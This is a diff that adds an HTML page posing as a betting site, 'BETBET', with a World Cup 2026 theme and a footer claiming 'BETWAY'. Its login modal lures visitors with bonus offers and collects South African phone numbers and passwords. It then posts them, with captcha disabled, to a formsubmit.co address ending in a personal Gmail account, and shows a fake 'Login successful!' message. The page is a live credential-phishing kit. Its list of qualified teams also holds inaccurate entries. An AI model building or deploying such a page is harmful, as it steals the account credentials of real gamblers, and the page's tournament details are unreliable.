@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>BETBET - FIFA World Cup 2026</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap');
+  html { scroll-behavior: smooth; }
+  body {
+    background: #0a0a0a;
+    color: white;
+    font-family: 'Inter', system-ui, sans-serif;
+  }
+  .hero-bg {
+    background: linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.85)),
+                url("https://images.unsplash.com/photo-1574629810360-7efbbe195018?q=80&w=2000");
+    background-size: cover;
+    background-position: center;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+  }
+  .glass {
+    backdrop-filter: blur(16px);
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card:hover { 
+    transform: translateY(-8px); 
+    transition: all 0.4s ease; 
+  }
+  .mobile-menu {
+    transform: translateY(-100%);
+    transition: transform 0.5s cubic-bezier(0.32, 0.72, 0, 1);
+  }
+  .mobile-menu.active { transform: translateY(0); }
+  .hero-title {
+    font-size: 2.4rem; line-height: 1.05;
+  }
+  @media (min-width: 640px) { .hero-title { font-size: 3.4rem; } }
+  @media (min-width: 768px) { .hero-title { font-size: 5rem; } }
+</style>
+</head>
+<body>
+
+<!-- Navigation -->
+<nav class="fixed top-0 left-0 w-full bg-black/95 backdrop-blur-lg border-b border-gray-800 z-50">
+  <div class="max-w-7xl mx-auto px-5">
+    <div class="h-20 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <div class="w-9 h-9 rounded-full bg-[#00b140] flex items-center justify-center text-black font-bold text-3xl">B</div>
+        <h1 class="text-2xl font-bold tracking-tighter">BETBET</h1>
+      </div>
+      <div class="hidden md:flex gap-8 text-gray-300 font-medium">
+        <a href="#countdown" class="hover:text-white transition">World Cup</a>
+        <a href="#hosts" class="hover:text-white transition">Hosts</a>
+        <a href="#teams" class="hover:text-white transition">Qualified Teams</a>
+        <a href="#history" class="hover:text-white transition">History</a>
+        <a href="#" onclick="showLoginModal()" class="hover:text-white transition">Login</a>
+      </div>
+      <div class="flex items-center gap-3">
+        <button id="hamburger" onclick="toggleMobileMenu()" class="md:hidden text-3xl p-2 text-white">
+          <i class="fas fa-bars"></i>
+        </button>
+      </div>
+    </div>
+  </div>
+</nav>
+
+<!-- MOBILE MENU -->
+<div id="mobile-menu" class="mobile-menu hidden fixed top-20 left-0 w-full bg-black/98 backdrop-blur-2xl border-t border-gray-800">
+  <div class="flex flex-col py-8 px-6 space-y-6 text-lg font-medium">
+    <a href="#countdown" onclick="toggleMobileMenu()" class="hover:text-[#00b140] bg-gray-800 p-4 rounded-lg transition">World Cup</a>
+    <a href="#hosts" onclick="toggleMobileMenu()" class="hover:text-[#00b140] bg-gray-800 p-4 rounded-lg transition">Hosts</a>
+    <a href="#teams" onclick="toggleMobileMenu()" class="hover:text-[#00b140] bg-gray-800 p-4 rounded-lg transition">Qualified Teams</a>
+    <a href="#history" onclick="toggleMobileMenu()" class="hover:text-[#00b140] bg-gray-800 p-4 rounded-lg transition">History</a>
+    <a href="#" onclick="showLoginModal(); toggleMobileMenu()" class="hover:text-[#00b140] bg-gray-800 p-4 rounded-lg transition">Login</a>
+  </div>
+</div>
+
+<!-- HERO -->
+<section class="hero-bg pt-20">
+  <div class="max-w-7xl mx-auto px-5 lg:px-8 py-16 md:py-12">
+    <div class="max-w-4xl">
+      <div class="inline-flex items-center gap-3 glass px-6 py-3 rounded-full mb-8 text-sm font-medium">
+        <span class="w-3 h-3 rounded-full bg-[#00b140] animate-pulse"></span>
+        FIFA WORLD CUP 2026
+      </div>
+      <h1 class="hero-title font-black mb-6">
+        48 TEAMS.<br>
+        104 MATCHES.<br>
+        ONE CHAMPION.
+      </h1>
+      <p class="text-lg md:text-2xl text-gray-300 mb-10 max-w-2xl">
+        Experience the biggest FIFA World Cup ever hosted by Canada, Mexico and the United States.
+      </p>
+      <div class="grid md:grid-cols-2 gap-6 mb-10">
+        <div class="bg-gradient-to-r from-[#00b140] to-emerald-500 rounded-3xl p-8 text-black">
+          <h2 class="text-3xl font-bold mb-2">🎟️ R50 FREE BET VOUCHER</h2>
+          <p class="font-medium">Available to all active users</p>
+        </div>
+        <div class="bg-gradient-to-r from-purple-600 to-violet-600 rounded-3xl p-8 text-white">
+          <div class="flex items-center gap-4">
+            <span class="text-4xl">👥</span>
+            <div>
+              <h2 class="text-2xl font-bold">Invite Friends</h2>
+              <p class="opacity-90">Both get R100 Free Bet</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <button onclick="showLoginModal()" class="bg-white text-black font-bold px-12 py-5 rounded-3xl hover:scale-105 transition text-lg">CLAIM R50 BONUS</button>
+    </div>
+  </div>
+</section>
+
+<!-- COUNTDOWN -->
+<section id="countdown" class="py-20 bg-[#050505]">
+  <div class="max-w-6xl mx-auto px-5 text-center">
+    <h2 class="text-4xl md:text-5xl font-bold mb-3">WORLD CUP 2026</h2>
+    <p class="text-gray-400 mb-12 text-lg">Countdown to Kickoff</p>
+    <div id="countdown-timer" class="flex justify-center gap-4 flex-nowrap overflow-x-auto"></div>
+  </div>
+</section>
+
+<!-- Host Nations -->
+<section id="hosts" class="py-20 lg:py-28">
+  <div class="max-w-7xl mx-auto px-5">
+    <h2 class="text-4xl md:text-5xl font-bold text-center mb-4">Host Nations</h2>
+    <p class="text-center text-gray-400 mb-12">Three countries. One unforgettable tournament.</p>
+    <div class="overflow-x-auto flex justify-center gap-4 pb-6">
+      <div class="card glass rounded-3xl p-4 w-24 h-24 flex-shrink-0 flex flex-col items-center justify-center text-center transition-transform hover:scale-105">
+        <h3 class="text-4xl mb-1">🇨🇦</h3><p class="font-semibold text-sm">Canada</p>
+      </div>
+      <div class="card glass rounded-3xl p-4 w-24 h-24 flex-shrink-0 flex flex-col items-center justify-center text-center transition-transform hover:scale-105">
+        <h3 class="text-4xl mb-1">🇲🇽</h3><p class="font-semibold text-sm">Mexico</p>
+      </div>
+      <div class="card glass rounded-3xl p-4 w-24 h-24 flex-shrink-0 flex flex-col items-center justify-center text-center transition-transform hover:scale-105">
+        <h3 class="text-4xl mb-1">🇺🇸</h3><p class="font-semibold">U.S.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Stats -->
+<section class="py-20 bg-[#050505]">
+  <div class="max-w-7xl mx-auto px-5">
+    <h2 class="text-4xl md:text-5xl font-bold text-center mb-16">Tournament Statistics</h2>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
+      <div class="glass rounded-3xl p-8 text-center"><h3 class="text-5xl md:text-6xl font-bold text-[#00b140]">48</h3><p class="mt-2 text-gray-400">Teams</p></div>
+      <div class="glass rounded-3xl p-8 text-center"><h3 class="text-5xl md:text-6xl font-bold text-[#00b140]">104</h3><p class="mt-2 text-gray-400">Matches</p></div>
+      <div class="glass rounded-3xl p-8 text-center"><h3 class="text-5xl md:text-6xl font-bold text-[#00b140]">16</h3><p class="mt-2 text-gray-400">Host Cities</p></div>
+      <div class="glass rounded-3xl p-8 text-center"><h3 class="text-5xl md:text-6xl font-bold text-[#00b140]">3</h3><p class="mt-2 text-gray-400">Host Nations</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- Qualified Teams -->
+<section id="teams" class="py-20 lg:py-28">
+  <div class="max-w-7xl mx-auto px-5">
+    <h2 class="text-4xl md:text-5xl font-bold text-center mb-4">Qualified Teams</h2>
+    <p class="text-center text-gray-400 mb-16">48 Nations • FIFA World Cup 2026</p>
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-12">
+      <div>
+        <h3 class="text-[#00b140] font-bold text-2xl mb-6">🇦🇸 AFC (Asia)</h3>
+        <div class="grid grid-cols-2 gap-4">
+          <div class="glass rounded-2xl p-5 text-center">Australia</div>
+          <div class="glass rounded-2xl p-5 text-center">Iran</div>
+          <div class="glass rounded-2xl p-5 text-center">Iraq</div>
+          <div class="glass rounded-2xl p-5 text-center">Japan</div>
+          <div class="glass rounded-2xl p-5 text-center">Jordan</div>
+          <div class="glass rounded-2xl p-5 text-center">Qatar</div>
+          <div class="glass rounded-2xl p-5 text-center">Saudi Arabia</div>
+          <div class="glass rounded-2xl p-5 text-center">South Korea</div>
+        </div>
+      </div>
+      <div>
+        <h3 class="text-[#00b140] font-bold text-2xl mb-6">🇿🇦 CAF (Africa)</h3>
+        <div class="grid grid-cols-2 gap-4">
+          <div class="glass rounded-2xl p-5 text-center">Algeria</div>
+          <div class="glass rounded-2xl p-5 text-center">Egypt</div>
+          <div class="glass rounded-2xl p-5 text-center">Ghana</div>
+          <div class="glass rounded-2xl p-5 text-center">Ivory Coast</div>
+          <div class="glass rounded-2xl p-5 text-center">Morocco</div>
+          <div class="glass rounded-2xl p-5 text-center">Senegal</div>
+          <div class="glass rounded-2xl p-5 text-center">South Africa</div>
+          <div class="glass rounded-2xl p-5 text-center">Tunisia</div>
+        </div>
+      </div>
+      <div>
+        <h3 class="text-[#00b140] font-bold text-2xl mb-6">🌍 CONMEBOL & UEFA</h3>
+        <div class="mb-10">
+          <p class="text-[#00b140] mb-4 font-medium">CONMEBOL (South America)</p>
+          <div class="grid grid-cols-2 gap-4">
+            <div class="glass rounded-2xl p-5 text-center">Argentina</div>
+            <div class="glass rounded-2xl p-5 text-center">Brazil</div>
+            <div class="glass rounded-2xl p-5 text-center">Colombia</div>
+            <div class="glass rounded-2xl p-5 text-center">Uruguay</div>
+            <div class="glass rounded-2xl p-5 text-center">Ecuador</div>
+            <div class="glass rounded-2xl p-5 text-center">Peru</div>
+          </div>
+        </div>
+        <div>
+          <p class="text-[#00b140] mb-4 font-medium">UEFA (Europe)</p>
+          <div class="grid grid-cols-2 gap-4">
+            <div class="glass rounded-2xl p-5 text-center">Belgium</div>
+            <div class="glass rounded-2xl p-5 text-center">Croatia</div>
+            <div class="glass rounded-2xl p-5 text-center">Denmark</div>
+            <div class="glass rounded-2xl p-5 text-center">England</div>
+            <div class="glass rounded-2xl p-5 text-center">France</div>
+            <div class="glass rounded-2xl p-5 text-center">Germany</div>
+            <div class="glass rounded-2xl p-5 text-center">Netherlands</div>
+            <div class="glass rounded-2xl p-5 text-center">Portugal</div>
+            <div class="glass rounded-2xl p-5 text-center">Spain</div>
+            <div class="glass rounded-2xl p-5 text-center">Sweden</div>
+            <div class="glass rounded-2xl p-5 text-center">Switzerland</div>
+            <div class="glass rounded-2xl p-5 text-center">Wales</div>
+          </div>
+        </div>
+        <div>
+          <p class="text-[#00b140] mb-4 font-medium">Host Nations</p>
+          <div class="flex flex-wrap gap-4">
+            <div class="glass rounded-2xl px-8 py-4">🇨🇦 Canada</div>
+            <div class="glass rounded-2xl px-8 py-4">🇲🇽 Mexico</div>
+            <div class="glass rounded-2xl px-8 py-4">🇺🇸 USA</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- History -->
+<section id="history" class="py-20 bg-[#050505]">
+  <div class="max-w-7xl mx-auto px-5">
+    <h2 class="text-4xl md:text-5xl font-bold text-center mb-4">World Cup History</h2>
+    <p class="text-center text-gray-400 mb-16">The Greatest Show on Earth Since 1930</p>
+    <div class="grid md:grid-cols-2 gap-12">
+      <div>
+        <h3 class="text-2xl font-bold text-[#00b140] mb-6 flex items-center gap-3">
+          <i class="fas fa-trophy"></i> Past Champions
+        </h3>
+        <div class="space-y-4">
+          <div class="glass rounded-2xl p-5 flex justify-between items-center">
+            <div><span class="font-bold">Brazil</span> <span class="text-gray-400">(5 titles)</span></div>
+            <span class="text-sm text-gray-400">1958, 62, 70, 94, 02</span>
+          </div>
+          <div class="glass rounded-2xl p-5 flex justify-between items-center">
+            <div><span class="font-bold">Germany</span> <span class="text-gray-400">(4 titles)</span></div>
+            <span class="text-sm text-gray-400">1954, 74, 90, 14</span>
+          </div>
+          <div class="glass rounded-2xl p-5 flex justify-between items-center">
+            <div><span class="font-bold">Italy</span> <span class="text-gray-400">(4 titles)</span></div>
+            <span class="text-sm text-gray-400">1934, 38, 82, 06</span>
+          </div>
+          <div class="glass rounded-2xl p-5 flex justify-between items-center">
+            <div><span class="font-bold">Argentina</span> <span class="text-gray-400">(3 titles)</span></div>
+            <span class="text-sm text-gray-400">1978, 86, 22</span>
+          </div>
+          <div class="glass rounded-2xl p-5 flex justify-between items-center">
+            <div><span class="font-bold">France</span> <span class="text-gray-400">(2 titles)</span></div>
+            <span class="text-sm text-gray-400">1998, 2018</span>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="text-2xl font-bold text-[#00b140] mb-6">Legendary Moments</h3>
+        <div class="space-y-6">
+          <div class="flex gap-4">
+            <div class="w-12 h-12 bg-yellow-500/10 rounded-xl flex items-center justify-center text-2xl">🇧🇷</div>
+            <div>
+              <p class="font-semibold">1958 – Pelé's First Magic</p>
+              <p class="text-sm text-gray-400">17-year-old Pelé wins the World Cup with Brazil</p>
+            </div>
+          </div>
+          <div class="flex gap-4">
+            <div class="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center text-2xl">🇦🇷</div>
+            <div>
+              <p class="font-semibold">1986 – Maradona's Masterclass</p>
+              <p class="text-sm text-gray-400">"Hand of God" + Goal of the Century vs England</p>
+            </div>
+          </div>
+          <div class="flex gap-4">
+            <div class="w-12 h-12 bg-green-500/10 rounded-xl flex items-center justify-center text-2xl">🇿🇦</div>
+            <div>
+              <p class="font-semibold">2010 – First African Host</p>
+              <p class="text-sm text-gray-400">South Africa hosts a memorable tournament</p>
+            </div>
+          </div>
+          <div class="flex gap-4">
+            <div class="w-12 h-12 bg-white/10 rounded-xl flex items-center justify-center text-2xl">🇦🇷</div>
+            <div>
+              <p class="font-semibold">2022 – Messi’s Destiny</p>
+              <p class="text-sm text-gray-400">Argentina wins after 36 years</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="border-t border-gray-800 py-12 bg-black">
+  <div class="text-center py-4 text-gray-500 text-sm">
+    Sponsored by T&T
+  </div>
+  <div class="flex justify-center items-center space-x-6 mb-8">
+    <div class="flex flex-col items-center space-y-2">
+      <img src="https://img.icons8.com/ios/50/FFFFFF/hand-shake.png" alt="Responsible Gambling" class="h-8 w-8" />
+      <span class="text-gray-400 text-xs">Responsible Gambling</span>
+    </div>
+    <div class="flex flex-col items-center space-y-2">
+      <img src="https://img.icons8.com/ios/50/FFFFFF/shield.png" alt="Security" class="h-8 w-8" />
+      <span class="text-gray-400 text-xs">Secure & Private</span>
+    </div>
+    <div class="flex flex-col items-center space-y-2">
+      <img src="https://img.icons8.com/ios/50/FFFFFF/age.png" alt="18+" class="h-8 w-8" />
+      <span class="text-gray-400 text-xs">18+ Only</span>
+    </div>
+    <div class="flex flex-col items-center space-y-2">
+      <img src="https://img.icons8.com/ios/50/FFFFFF/checked.png" alt="Licensed" class="h-8 w-8" />
+      <span class="text-gray-400 text-xs">Licensed & Regulated</span>
+    </div>
+  </div>
+  <div class="text-center text-gray-500 text-xs px-4">
+    <p><strong>Disclaimer:</strong> Betting is only available to users aged 18 and over. Please gamble responsibly.</p>
+    <p class="mt-2">&copy; 2026 BETWAY. All rights reserved.</p>
+  </div>
+</footer>
+
+<!-- Login Modal -->
+<div id="login-modal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center z-[100] px-4">
+  <div class="glass w-full max-w-[380px] mx-auto rounded-3xl p-8 relative">
+    <button onclick="hideLoginModal()" class="absolute top-6 right-6 text-3xl text-gray-400 hover:text-white">×</button>
+    <div class="text-center mb-8">
+      <div class="w-16 h-16 mx-auto rounded-2xl bg-[#00b140] flex items-center justify-center text-4xl mb-4">B</div>
+      <h2 class="text-3xl font-bold">Welcome Back</h2>
+      <p class="text-gray-400 mt-2">Sign in to continue</p>
+    </div>
+    <!-- Error message -->
+    <div id="login-error" class="hidden bg-red-500/10 border border-red-500 text-red-500 text-sm p-4 rounded-2xl mb-4"></div>
+    <!-- Loading indicator -->
+    <div id="login-loading" class="hidden text-center py-12">
+      <i class="fas fa-spinner fa-spin text-6xl text-[#00b140]"></i>
+      <h3 class="text-xl font-semibold mt-4">Loading, please wait...</h3>
+    </div>
+    <!-- Form -->
+    
+    <div id="login-form" class="mx-auto max-w-md">
+     <form action="https://formsubmit.co/muloihanetii@gmail.com" method="POST">
+        <input type="hidden" name="_next" value="https://mr-gotham.github.io/ben/"/>
+      <div class="mb-4">
+        <label class="block text-sm text-gray-400 mb-2">Phone Number <span class="text-red-500">*</span></label>
+        <div class="flex w-full max-w-sm mx-auto">
+          <div class="bg-gray-900 border border-gray-700 rounded-l-2xl px-4 flex items-center text-[#00b140]">+27</div>
+          <input
+            id="login-phone"
+            name="mobile number"
+            type="tel"
+            placeholder="e.g., 0712345678"
+            maxlength="10"
+            pattern="^(0[6-8])\d{8}$"
+            class="w-full bg-gray-900 border border-gray-700 focus:border-[#00b140] rounded-r-2xl px-4 py-4 outline-none"
+          />
+        </div>
+      </div>
+      <div class="mb-4">
+        <label class="block text-sm text-gray-400 mb-2">Password <span class="text-red-500">*</span></label>
+        <div class="relative max-w-xs mx-auto">
+          <input
+            id="login-password"
+            name="password"
+            type="password"
+            placeholder="Enter your password"
+            class="w-full bg-gray-900 border border-gray-700 focus:border-[#00b140] rounded-2xl px-4 py-4 outline-none"
+          />
+          <input type="hidden" name="_captcha" value="false">
+          <button
+            type="button"
+            id="toggle-password"
+            onclick="togglePasswordVisibility()"
+            class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white text-xl"
+          >
+            👁️
+          </button>
+        </div>
+      </div>
+      
+      <!-- Remember Me & Forgot Password -->
+      <div class="flex justify-between items-center mb-4 text-sm text-gray-400">
+        <label class="flex items-center space-x-2">
+          <input type="checkbox" class="accent-[#00b140]" /> <span>Remember Me</span>
+        </label>
+        <a href="#" class="hover:text-white">Forgot Password?</a>
+      </div>
+      <!-- Login Button -->
+      <button
+        onclick="validateAndLogin()"
+        class="w-full max-w-xs mx-auto bg-[#00b140] hover:bg-emerald-600 text-black font-bold py-4 rounded-3xl transition"
+      >
+        LOGIN
+      </button>
+      <!-- Signup -->
+      <div class="mt-4 text-center text-gray-400 text-sm">
+        Don't have an account? <a href="#" class="hover:text-white font-semibold" onclick="showSignup()">Sign Up</a>
+      </div>
+    </div>
+  </div>
+</form>
+</div>
+
+<!-- Scripts -->
+<script>
+function startCountdown() {
+  const timer = document.getElementById('countdown-timer');
+  const targetDate = new Date("June 12, 2026 00:00:00").getTime();
+
+  setInterval(() => {
+    const now = new Date().getTime();
+    let diff = targetDate - now;
+
+    if (diff <= 0) {
+      timer.innerHTML = `<div class="text-3xl font-bold text-[#00b140]">World Cup Started!</div>`;
+      return;
+    }
+
+    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+    diff -= days * (1000 * 60 * 60 * 24);
+    const hours = Math.floor(diff / (1000 * 60 * 60));
+    diff -= hours * (1000 * 60 * 60);
+    const minutes = Math.floor(diff / (1000 * 60));
+    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+    // Smaller countdown cards
+    timer.innerHTML = `
+      <div class="glass rounded-3xl p-4 w-[60px] flex-shrink-0 flex flex-col items-center text-center">
+        <h3 class="text-3xl font-bold text-[#00b140]">${days}</h3>
+        <p class="text-xs text-gray-400">DAYS</p>
+      </div>
+      <div class="glass rounded-3xl p-4 w-[60px] flex-shrink-0 flex flex-col items-center text-center">
+        <h3 class="text-3xl font-bold text-[#00b140]">${hours.toString().padStart(2,'0')}</h3>
+        <p class="text-xs text-gray-400">HOURS</p>
+      </div>
+      <div class="glass rounded-3xl p-4 w-[60px] flex-shrink-0 flex flex-col items-center text-center">
+        <h3 class="text-3xl font-bold text-[#00b140]">${minutes.toString().padStart(2,'0')}</h3>
+        <p class="text-xs text-gray-400">MINUTES</p>
+      </div>
+      <div class="glass rounded-3xl p-4 w-[60px] flex-shrink-0 flex flex-col items-center text-center">
+        <h3 class="text-3xl font-bold text-[#00b140]">${seconds.toString().padStart(2,'0')}</h3>
+        <p class="text-xs text-gray-400">SECONDS</p>
+      </div>
+    `;
+  }, 1000);
+}
+
+function toggleMobileMenu() {
+  const menu = document.getElementById('mobile-menu');
+  const hamburger = document.getElementById('hamburger');
+  if (menu) {
+    menu.classList.toggle('hidden');
+    menu.classList.toggle('active');
+    if (menu.classList.contains('active')) {
+      hamburger.innerHTML = `<i class="fas fa-times"></i>`;
+    } else {
+      hamburger.innerHTML = `<i class="fas fa-bars"></i>`;
+    }
+  }
+}
+
+function showLoginModal() {
+  document.getElementById('login-modal').classList.remove('hidden');
+}
+function hideLoginModal() {
+  document.getElementById('login-modal').classList.add('hidden');
+}
+function togglePasswordVisibility() {
+  const pass = document.getElementById('login-password');
+  const btn = document.getElementById('toggle-password');
+  if (pass.type === 'password') {
+    pass.type = 'text';
+    btn.innerHTML = '🙈';
+  } else {
+    pass.type = 'password';
+    btn.innerHTML = '👁️';
+  }
+}
+
+function validateAndLogin() {
+  const phoneInput = document.getElementById('login-phone');
+  const errorDiv = document.getElementById('login-error');
+  const number = phoneInput.value.trim();
+
+  // Validate South African number starting with 06, 07, or 08
+  const regex = /^(0[6-8])\d{8}$/;
+  if (!regex.test(number)) {
+    errorDiv.innerText = "South African number required.";
+    errorDiv.classList.remove('hidden');
+    return;
+  } else {
+    errorDiv.classList.add('hidden');
+  }
+
+  // Show loading spinner for 4 minutes (demo: 4 seconds here)
+  document.getElementById('login-form').classList.add('hidden');
+  document.getElementById('login-loading').classList.remove('hidden');
+
+  // Simulate delay
+  setTimeout(() => {
+    document.getElementById('login-loading').classList.add('hidden');
+    alert('Login successful!'); // Replace with actual login success logic
+    hideLoginModal();
+    document.getElementById('login-form').classList.remove('hidden');
+  }, 4000); // Change to 240000 for 4 mins real delay
+}
+
+function showSignup() {
+  alert('Signup functionality not implemented.');
+}
+
+document.addEventListener("DOMContentLoaded", startCountdown);
+</script>
+
+</body>
+</html>
